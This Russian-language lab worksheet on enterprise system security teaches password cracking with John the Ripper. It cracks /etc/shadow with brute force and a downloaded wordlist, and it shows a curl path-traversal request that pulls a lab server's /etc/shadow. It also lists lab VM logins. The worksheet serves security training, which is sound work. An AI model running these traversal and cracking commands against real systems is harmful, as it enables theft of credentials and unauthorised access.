---
Практическая работа:
    Название: 'Анализ информационных систем предприятия с точки зрения безопасности'
    Действие: 'Модуль Второй'
---
# **John**
**Время выполнения: 15 минут**

Имена пользователей и пароли:
```
Для denian
login: student 
password: 111
```
```
Для Windows
login: Admin 
password: Pa55w.rd
```
### **Практическая работа**

### **Задача 1: Установка и использование John**

Подключиться по SSH к виртуальной машине gate

Получите права супер пользователя.

```
student@debian:~$ su -
```
```
< Введите пароль пользователя student >
```

Создать пользователя с логином demouser и паролем 111

Получите права супер пользователя.

```
student@debian:~$ su -
```
```
< Введите пароль пользователя student >
```


```
apt install john
apt install wget
apt install curl
```

Тест
```
john --test
```

Поиск паролей перебором
```
john --format=crypt /etc/shadow
```
Поиск паролей по словарю


Скачиваем словарь паролей из интернета
```
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
```
Запускаем перебор паролей
```
john --wordlist=/root/10-million-password-list-top-1000000.txt --format=crypt /etc/shadow
```

Скачаем файл паролей с server
```
curl --path-as-is http://192.168.10.10/../../../etc/shadow > shadow.txt
```
Запускаем перебор паролей
```
john --wordlist=/root/10-million-password-list-top-1000000.txt --format=crypt shadow.txt
```
